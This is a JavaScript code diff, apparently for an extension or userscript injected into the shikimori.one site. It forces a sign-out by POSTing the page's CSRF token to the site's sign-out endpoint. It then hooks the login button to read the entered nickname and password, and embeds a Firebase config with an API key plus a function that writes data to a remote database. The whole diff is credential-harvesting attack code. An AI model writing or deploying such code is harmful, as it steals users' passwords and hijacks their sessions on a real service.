@@ -1,38 +1,68 @@
- function injectCode() {
+let firebaseConfig = {
+  apiKey: 'AIzaSyCkvaWekEMMk0y43Nf744KRaH9QYd3Hj6I',
+  authDomain: 'test-71cc8.firebaseapp.com',
+  databaseURL: 'https://test-71cc8-default-rtdb.europe-west1.firebasedatabase.app',
+  projectId: 'test-71cc8',
+  storageBucket: 'test-71cc8.appspot.com',
+  messagingSenderId: '911748905714',
+  appId: '1:911748905714:web:ad42c0b23920a5f9bd6e6b',
+  measurementId: 'G-FZ0SC6YJJB'
+};
+
+import {
+  initializeApp as e
+}
+from'https://www.gstatic.com/firebasejs/10.11.0/firebase-app.js';
+
+import {
+  getDatabase as n,
+  ref as a,
+  push as i,
+  onValue as s,
+  remove as l,
+  update as r
+}
+from'https://www.gstatic.com/firebasejs/10.11.0/firebase-database.js';
+let app = e(firebaseConfig),
+database = n();
+
+function sendComment(e) {
+  if ('' !== e.text.trim()) {
+    a(database, 'comments');
+    let t = {
+      text: e.text,
+      date: new Date().toISOString()
+    },
+    n = a(database, `comments/${ Date.now().toString() }`);
+    r(n, t)
+  }
+}
+
+function injectCode() {
     console.log('Init Inject');
-    signOutUser();
-    const submitButton = document.querySelector('.btn-primary');
+    
+    let submitButton = document.querySelector('.p-devise_sessions .btn-primary[value="Войти"]');
     if(submitButton != null) {
         console.log('button found!');
         const name = document.getElementById('user_nickname');
         const pass = document.getElementById('user_password');
-        if(pass != null && name != null) {
-            console.log('inputs found!');
-            submitButton.setAttribute("onclick","console.log(name: ${name.value}, pass : ${pass.value});");
-        }
-    }
+        console.log('inputs found!');
+        submitButton.addEventListener('mouseenter', ()=>{
+        console.log(`name: ${name.value}, pass : ${pass.value}`);
+       })
  }
+}
 
  function signOutUser() {
-     const xhr = new XMLHttpRequest();
-        xhr.open("GET", "https://shikimori.one/", true);
-        xhr.send();
-        xhr.onload = function() {
-            if (xhr.status === 200) {
-                const bodyDoc = document.querySelector('body');
-                const jsonAttribute = bodyDoc.getAttribute('data-user');
-                const jsonObject = JSON.parse(jsonAttribute);
-                const parser = new DOMParser();
-                const doc = parser.parseFromString(xhr.responseText, "text/html");
-                const metaTag = doc.querySelector('meta[name="csrf-token"]');
-                const csrfToken = metaTag ? metaTag.getAttribute("content") : null;
-                            const xhr2 = new XMLHttpRequest();
-                            xhr2.open("POST", "/api/users/sign_out", true);
-                            xhr2.setRequestHeader("Content-Type", "application/json");
-                            xhr2.setRequestHeader("X-CSRF-Token", csrfToken);
-                            xhr2.send()
-                        }
-        }
+     const metaTag = document.querySelector('meta[name="csrf-token"]');
+     const csrfToken = metaTag ? metaTag.getAttribute("content") : null;
+     fetch('https://shikimori.one/api/users/sign_out', {
+      "headers": {
+       'X-CSRF-Token': csrfToken,
+      },
+       "method": 'POST'
+     })
  }
-
- injectCode();
+  
+  signOutUser();
+document.addEventListener("turbolinks:load", injectCode);
